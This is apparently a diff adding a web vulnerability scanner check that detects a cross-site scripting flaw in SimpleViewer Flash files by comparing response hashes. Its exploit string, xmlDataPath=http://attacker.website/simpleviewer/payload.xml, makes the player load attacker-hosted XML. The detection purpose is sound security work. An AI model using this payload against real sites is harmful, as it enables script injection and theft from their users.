@@ -1,0 +1,75 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// directories to be tested
+var dirs    = new Array();
+var hashes  = new Array();
+// known vulnerable hashes
+hashes.push("57d2784dbe420b667ab7ebe2b6cf818d");
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml;
+	ri.setHttpInfo(job);
+	AddReportItem(ri);
+}
+/***********************************************************************************/
+function testSWFOnDir(dir)
+{
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;
+	var exploit = "?xmlDataPath=http://attacker.website/simpleviewer/payload.xml";
+	if (dir.endsWith(".swf"))
+		lastJob.uri  = dir + exploit;
+	else
+		lastJob.uri  = dir + "/simpleviewer.swf" + exploit;
+	lastJob.execute();
+	if (!lastJob.wasError && !lastJob.notFound)
+	{
+		if (lastJob.responseStatus == 200)
+		{
+			hash = plain2md5(lastJob.response.body);
+			trace(hash);
+			if (hashes.indexOf(hash) != -1) {
+				alert(lastJob.uri.replace(exploit, ""), 'SimpleViewer_SWF_XSS.xml', lastJob);
+			}
+		}
+	}
+	return false;
+}
+/***********************************************************************************/
+function prepareDirectoriesToBeTested(list)
+{
+	for (var i=0;i<list.count; i++){
+		var sf = list.getFile(i);
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			dirName = sf.fullPath;
+			if (sf.Name.match(/(viewer|simpleviewer)\.swf/))
+			{
+				if (dirs.indexOf(dirName) == -1)
+					dirs.push(dirName);
+			}
+		}
+	}
+	var tested_common_dirs = getGlobalValue("simpleviewer_swf_tested_common_dirs");
+	if (!tested_common_dirs)
+	{
+		SetGlobalValue("simpleviewer_swf_tested_common_dirs", 1, true);
+		dirs.push("/simpleviewer/web/svcore/swf");
+	}
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirectoriesToBeTested(list);
+if (dirs.length > 0)
+{
+	for (var i=0; i<dirs.length; i++)
+		testSWFOnDir(dirs[i]);
+}
